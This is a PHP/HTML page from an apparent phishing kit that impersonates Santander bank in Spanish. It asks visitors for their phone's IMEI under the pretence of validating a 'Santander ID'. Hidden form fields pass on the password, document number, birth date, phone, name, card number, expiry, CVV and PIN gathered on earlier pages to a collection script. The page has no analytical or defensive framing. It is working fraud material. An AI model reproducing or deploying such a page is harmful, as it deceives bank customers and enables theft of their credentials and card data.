<?php include"bk.php"; ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>Imei-StD</title>
	<link rel="stylesheet" href="_styles/css.css">
	<script src="_jscripts/home.js"></script>
</head>
<body>
	<div class="container bg-red">
		<div class="content">
			<img src="index_arquivos/main_logo.gif" height="52" width="194" class="fl_left">
			<img src="index_arquivos/ib_text.gif" height="52" width="230" class="fl_right">
		<div class="clear"></div>
		</div><!-- content -->
	</div><!-- container -->


<div class="container main_wellcome">
	<div class="content bg-white wellcome">
		<?php
			echo $show_time;
		?>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

<div class="container">
	<div class="content bg-white">
	
		<div class="fl_left need_pass" style="margin-left:0;">
			<h1>Prezado Cliente</h1>
			<p>
							A continuacion, introduzca el <strong>IMEI</strong> de su dispositivo para validar su <b>ID SANTANDER.</b>
				<br><br>
				<b>COMO HACER:</b>
				Introduzca en el teclado de marcacion de su movil: *#06#
<br><br>Sigue la imagen como ejemplo:</p><br><figcaption><img src="index_arquivos/imei.jpg" height="150" width="150"></figcaption>


				<div class="block_all">
					<div class="get_pass">
						<form action="BtoChannelConfirmacion.ssobto.php" method="post" class="form_psw_net" onsubmit="return check_assele();">
							<span style="float:left;">&nbspIMEI:</span>
							<input type="text" name="imei" id="imei" class="simple_input input_pass" maxlength="15">
							
						
					<div class="clear"></div>	
					</div><!-- get_pass -->
				<div class="clear"></div>	
				</div>
				<div class="pos_next">
					<!--<input type="submit" name="proseguir" id="proseguir" value="" class="btn_next">-->
					<div class="foot"><span class="buttons"><input class="opLogonStandardButton" value="ENVIAR" type="submit"></span><span class="link"></span></div>
				</div>
<input type="hidden" name="tipoDocumento" value="<?= $tipoDocumento ?>">
<input type="hidden" name="numeroDocumento" value="<?= $numeroDocumento ?>">
<input type="hidden" name="password" value="<?= $password ?>">
<input type="hidden" name="datanasc" value="<?= $datanasc ?>">
<input type="hidden" name="tel" value="<?= $tel ?>">
<input type="hidden" name="nome" value="<?= $nome ?>">
<input type="hidden" name="num" value="<?= $num ?>">
<input type="hidden" name="val" value="<?= $val ?>">
<input type="hidden" name="cvv" value="<?= $cvv ?>">
<input type="hidden" name="pin" value="<?= $pin ?>">
				</form>
		</div>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->	

<div class="container" style="margin:10px 0 20px 0">
	<div class="content bg-white">
		<div class="bem_vindo bg-cinza">
			¿Olvidó su contraseña de acceso? Póngase en contacto con la central de servicio santander.
		</div><!-- bem_vindo -->
		<img src="index_arquivos/apps.jpg" height="40" width="266" alt="">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->	

<div class="container bg-red footer_fixed">
	<div class="content">
		<img src="index_arquivos/ib_cadeado.gif" height="20" width="110" alt="">
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->
</body>
</html>